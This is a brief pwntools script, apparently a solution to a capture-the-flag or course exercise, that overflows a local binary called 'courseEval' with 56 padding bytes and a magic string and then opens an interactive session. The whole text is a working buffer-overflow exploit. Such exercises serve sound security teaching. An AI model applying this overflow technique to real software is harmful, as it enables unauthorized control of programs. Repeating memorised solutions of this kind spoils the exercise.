from pwn import *

p = process('./courseEval')

garbage = b'a'*56 + b'UniPD_01CPP-PWN-Pier'
p.sendline(garbage)
p.interactive()
